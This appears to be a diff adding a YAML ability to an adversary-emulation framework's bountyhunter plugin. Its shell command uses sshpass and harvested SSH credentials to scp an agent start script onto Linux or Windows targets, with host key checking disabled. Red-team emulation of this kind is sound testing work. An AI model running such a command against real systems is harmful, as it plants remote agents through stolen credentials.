@@ -1,0 +1,56 @@
+- delete_payload: true
+  technique_name: Valid Accounts
+  buckets:
+  - initial_access
+  description: This ability copies the start_agent script via scp using known SSH credentials on Linux and Windows.
+  singleton: false
+  technique_id: T10781
+  plugin: bountyhunter
+  repeatable: false
+  privilege: ''
+  access: {}
+  name: Copy start agent via scp over ssh
+  requirements:
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+    - source: bountyhunter.network.ip
+      edge: has_os
+      target: host.os
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: host.ssh.user
+        edge: has_ssh_pwd
+        target: host.ssh.pwd
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: bountyhunter.network.ip
+        edge: has_ssh_user
+        target: host.ssh.user
+  additional_info: {}
+  executors:
+  - timeout: 60
+    cleanup: []
+    payloads: []
+    uploads: []
+    platform: linux
+    build_target: null
+    variations: []
+    additional_info: {}
+    command: '
+      if [ #{host.os} = Windows ];
+        then sshpass -p #{host.ssh.pwd} scp -vvv caldera/plugins/bountyhunter/payloads/start_agent_from_windows_target.ps1 #{host.ssh.user}@#{bountyhunter.network.ip}:C:/Users/Public/start_agent.ps1 2>&1; 
+      elif [ #{host.os} = Linux ];
+        then sshpass -p #{host.ssh.pwd} scp -vv -o StrictHostKeyChecking=no caldera/plugins/bountyhunter/payloads/start_agent_from_linux_target.sh #{host.ssh.user}@#{bountyhunter.network.ip}:start_agent.sh 2>&1; 
+      fi;'
+    code: null
+    name: sh
+    language: null
+    parsers:
+      - module: plugins.bountyhunter.app.parsers.scp
+        parserconfigs:
+          - edge: has_file
+            custom_parser_vals: { }
+            source: bountyhunter.network.ip
+            target: host.file.start_agent
+  tactic: initial_access
+  id: 6a49e8f3-0c00-436e-a848-06de496a942f
